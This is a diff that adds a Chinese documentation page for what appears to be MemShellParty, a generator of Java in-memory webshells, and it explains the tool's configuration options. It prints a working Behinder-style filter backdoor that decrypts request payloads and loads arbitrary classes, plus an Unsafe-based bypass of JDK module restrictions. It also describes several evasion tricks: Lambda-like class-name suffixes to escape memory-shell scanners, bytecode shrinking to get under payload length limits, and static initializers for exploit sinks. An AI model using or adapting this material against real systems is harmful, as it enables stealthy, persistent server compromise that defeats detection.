@@ -1,0 +1,274 @@
+---
+title: 核心配置项
+description: 了解和使用那些可能用到的一键开关
+---
+
+### 服务类型
+
+所需要注入内存马的 Java 服务类型，目前支持以下方式。
+
+如果在以下列表中未找到，可先查看 [目标服务介绍](/docs/server-intro) 是否有提到
+
+如果仍然没有，则可提 [issue](https://github.com/ReaJason/MemShellParty/issues/new?template=%E8%AF%B7%E6%B1%82%E9%80%82%E9%85%8D.md) 请求适配
+
+- [x] Tomcat
+- [x] Jetty
+- [x] Undertow
+- [x] JBoss
+- [x] Resin
+- [x] WebLogic
+- [x] WebSphere
+- [x] GlassFish
+- [x] TongWeb
+- [x] BES
+- [x] InforSuite
+- [x] Apusic
+- [x] SpringWebMvc
+- [x] SpringWebFlux
+- [x] XXLJOB
+- [x] Struct2
+
+### 服务版本
+
+服务版本用于部分中间件不同版本之间包名不同，需要进行单独适配的情况，默认 Unknown 即可。
+
+仅以下两种内存马用到：
+
+1. TongWeb Valve 内存马：可选值为 6、7、8
+2. Jetty Handler/JakartaHandler 内存马：可选值为 6、7+、12
+
+### 内存马工具
+
+所需要注入内存马工具类型，目前支持以下几种方式：
+
+- [x] [Godzilla](/docs/godzilla)
+- [x] Behinder
+- [x] Command
+- [x] [Suo5](/docs/suo5)
+- [x] [Suo5v2](/docs/suo5)
+- [x] AntSword
+- [x] NeoreGeorg
+- [x] Custom：自定义内存马，用于上续工具都不是想要的情况下，参考 [实现自定义内存马](/docs/custom-memshell) 进行使用
+
+### 调试模式
+
+集成测试用例仅测试了各中间件大版本下的兼容情况，不可避免地某些版本可能存在问题，一味地去除各种打印信息在这种情况下排查问题是棘手的，因此有了调试模式。
+
+1. 处理第一个问题，内存马是否注入成功，当开启调试模式后内存马注入器使用 System.out.println 向业务日志打印注入信息
+
+```java
+if (ok) {
+    return;
+}
+Set<Object> contexts = null;
+try {
+    contexts = getContext();
+} catch (Throwable throwable) {
+    msg += "context error: " + getErrorMessage(throwable);
+}
+if (contexts == null) {
+    msg += "context not found";
+} else {
+    for (Object context : contexts) {
+        try {
+            msg += ("context: [" + getContextRoot(context) + "] ");
+            Object shell = getShell(context);
+            inject(context, shell);
+            msg += "[" + getUrlPattern() + "] ready\n";
+        } catch (Throwable e) {
+            msg += "failed " + getErrorMessage(e) + "\n";
+        }
+    }
+}
+ok = true;
+System.out.println(msg);// [!code highlight]
+```
+
+2. 处理第二个问题，内存马注入成功但是连不上怎么回事，当开启调试模式后内存马工具类使用 e.printStackTrace 向业务输出错误堆栈
+
+```java
+@Override
+public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+    HttpServletRequest request = (HttpServletRequest) servletRequest;
+    HttpServletResponse response = (HttpServletResponse) servletResponse;
+
+    try {
+        if (request.getHeader(this.headerName) != null
+                && request.getHeader(this.headerName).contains(this.headerValue)) {
+            HttpSession session = ((HttpServletRequest) servletRequest).getSession();
+            Map<String, Object> obj = new HashMap<String, Object>(3);
+            obj.put("request", servletRequest);
+            obj.put("response", unwrap(response));
+            obj.put("session", session);
+            session.setAttribute("u", this.pass);
+            Cipher c = Cipher.getInstance("AES");
+            c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
+            byte[] bytes = c.doFinal(base64Decode(servletRequest.getReader().readLine()));
+            Object instance = new BehinderFilter(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length).newInstance();
+            instance.equals(obj);
+            return;
+        }
+    } catch (Throwable e) {
+        e.printStackTrace();// [!code highlight]
+    }
+    filterChain.doFilter(servletRequest, servletResponse);
+}
+```
+
+调试所用的打印代码默认是写在模板中的，因此当关闭调试模式的时候，我们会使用字节码修改技术对打印调试信息的函数调用进行删除，详细实现可参考：[LogRemoveMethodVisitor.java](https://github.com/ReaJason/MemShellParty/blob/master/memshell-party-common/src/main/java/com/reajason/javaweb/buddy/LogRemoveMethodVisitor.java)，也就是把以下三种函数调用给去除
+```java
+System.out.println(msg) //（printf 还不支持）
+
+e.printStackTrace()
+
+Logger.info(msg) // (java.util)
+```
+
+### 回显模式
+
+<Callout title="注意" type="warn">
+  并不是所有服务都支持回显马，因此在不支持的服务开启回显模式，也享受不到回显效果
+</Callout>
+
+调试模式仅限于我们能访问到业务日志，但是实战过程中，在没 getshell 前我们获取不到服务器权限，并且调试模式在目标业务打印大段注入信息属实敏感，因此有了回显模式。
+
+**回显模式主要解决的问题是实战过程中判断内存马注入是否成功。**
+
+当开启回显后，会将注入器字节码放置到回显马中，返回一个目标服务类型的回显马，代码执行顺序为：回显马运行 -> 注入器注入 -> 挂载内存马。
+
+<Callout title="额外注意" type="warn">
+  由于回显马需要从当前线程获取 request 和 response 对象，因此跨线程 RCE 的环境下，无法回显，根据代码执行顺序，无法回显的环境，开启回显模式之后注入器也不会进行注入动作，因此支持回显马但无法回显的环境，请一定不要开启回显模式。
+</Callout>
+
+
+### 绕过模块限制
+
+JDK9+ 有了模块化系统，严格限制各大函数的调用。注入器在注入内存马时需要使用反射调用 defineClass，不是 java.base 模块无法调用，开启绕过模块限制会在注入器自动插入绕过模块限制的代码。也就是如下这坨代码：
+```java
+try {
+    Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
+    java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+    unsafeField.setAccessible(true);
+    Object unsafe = unsafeField.get(null);
+    Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
+    java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
+    Long offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
+    java.lang.reflect.Method getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
+    getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
+} catch (Exception ignored) {
+}
+```
+
+### Lambda 类名后缀
+
+由于目前 RASP 并未广泛普及，内存马无文件的特性仅在 RASP 面前一览无余，在其他设备上就犹如神力无法被精准检测。而目前绝大多数主动扫描内存马设备为了降低 dumpClass 风险和增加效率，并不会将 JVM 中所有的类进行分析，可能设置有白名单，而 Lambda 类名是众多一线渗透专家测试出来的结果。在类名中添加 Lambda 类名特征即可绕过主动扫描设备。
+
+开启 Lambda 类名后缀之后，会在注入器和内存马类名后自动加入 `$Proxy0$$Lambda$1`。
+
+### 缩小字节码
+
+默认情况下，一个内存马就有 1w 多长度，因此越来越多的地方做了长度限制，异常的长度认为是恶意行为，例如 SpEL 高版本仅支持 10,000 以下字符长度的表达式执行。
+
+以下三种方式中，测试结果显示当前项目使用的 ASM SKIP_DEBUG 缩小字节码最小：
+
+1. 普通编译类文件：8943 长度
+2. Javassist 去除属性：8003 长度
+3. javac 去除调试信息：6658 长度
+4. ASM SKIP_DEBUG：**6349** 长度
+
+
+#### Javassist 去除属性
+
+由于 Javassist 被用于各类反序列化字节码工具中，因此使用最为广泛，以下字节码缩小代码被广为流传
+
+```java
+public static byte[] shrink(byte[] classBytes) throws Exception {
+    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+    DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
+    ClassPool classPool = new ClassPool();
+    classPool.appendSystemPath();
+    CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(classBytes));
+    ClassFile classFile = ctClass.getClassFile2();
+    classFile.removeAttribute("SourceFile");
+    classFile.removeAttribute("LineNumberTable");
+    classFile.removeAttribute("LocalVariableTable");
+    classFile.removeAttribute("LocalVariableTypeTable");
+    classFile.removeAttribute("Deprecated");
+    classFile.removeAttribute("Signature");
+    classFile.removeAttribute("StackMapTable");
+    for (MethodInfo methodInfo : classFile.getMethods()) {
+        methodInfo.removeAttribute("RuntimeVisibleAnnotations");
+        methodInfo.removeAttribute("RuntimeInvisibleAnnotations");
+        methodInfo.removeAttribute("SourceFile");
+        methodInfo.removeAttribute("LineNumberTable");
+        methodInfo.removeAttribute("LocalVariableTable");
+        methodInfo.removeAttribute("LocalVariableTypeTable");
+        methodInfo.removeAttribute("Deprecated");
+        methodInfo.removeAttribute("Signature");
+        methodInfo.removeAttribute("StackMapTable");
+        List<AttributeInfo> attributes = ((CodeAttribute) methodInfo.getAttribute("Code")).getAttributes();
+        ArrayList arrayList = new ArrayList();
+        for (AttributeInfo attributeInfo : attributes) {
+            if ("StackMapTable".equals(attributeInfo.getName()) || "LineNumberTable".equals(attributeInfo.getName())) {
+                arrayList.add(attributeInfo);
+            }
+        }
+        for (Object o : arrayList) {
+            attributes.remove((AttributeInfo) o);
+        }
+    }
+    ctClass.toBytecode(dataOutputStream);
+    ctClass.detach();
+    ctClass.defrost();
+    return byteArrayOutputStream.toByteArray();
+}
+```
+
+#### javac 去除调试信息
+
+忘记在哪篇文章，看到说测试当前情况为最佳，手动编译类，添加 `-g:none` 参数跳过类的调试信息。
+
+```java
+javac -g:none xx.java
+```
+
+#### ASM SKIP_DEBUG
+
+在一次偶然的机会，我在看 ClassReader 的 flag 都是做什么时，注意到了 SKIP_DEBUG 注释里面的描述，删除各种 SourceFile, SourceDebugExtension, LocalVariableTable, LocalVariableTypeTable, LineNumberTable and MethodParameters 属性，这不是和 Javassist 去除属性代码有点类似。
+
+```java
+public class ClassReader {
+  /**
+   * A flag to skip the SourceFile, SourceDebugExtension, LocalVariableTable,
+   * LocalVariableTypeTable, LineNumberTable and MethodParameters attributes. If this flag is set
+   * these attributes are neither parsed nor visited (i.e. {@link ClassVisitor#visitSource}, {@link
+   * MethodVisitor#visitLocalVariable}, {@link MethodVisitor#visitLineNumber} and {@link
+   * MethodVisitor#visitParameter} are not called).
+   */
+  public static final int SKIP_DEBUG = 2;
+}
+```
+
+于是我果断的写下了以下代码，发现其比 Javassist 去除属性效果更好：
+
+```java
+public static byte[] shrink(byte[] bytes) {
+    ClassReader cr = new ClassReader(bytes);
+    ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
+    ClassVisitor cv = new ClassVisitor(Opcodes.ASM9, cw) {};
+    cr.accept(cv, ClassReader.SKIP_DEBUG);
+    return cw.toByteArray();
+}
+```
+
+### 静态初始化
+
+当前注入器实现的逻辑都在构造方式中，不过并不是所有的漏洞 sink 点我们都能触发到 newInstance 方法调用构造方法实例化对象，因此我们加入了静态初始化开关，当开启后，会在类中添加静态代码块调用构造方法，例如：
+
+```java
+static {
+    new ImageUtil();
+}
+```
+
+这样使得部分漏洞 sink 点为 `Class.forName(name, true, classLoader);` 的场景也能正常触发内存马注入了。
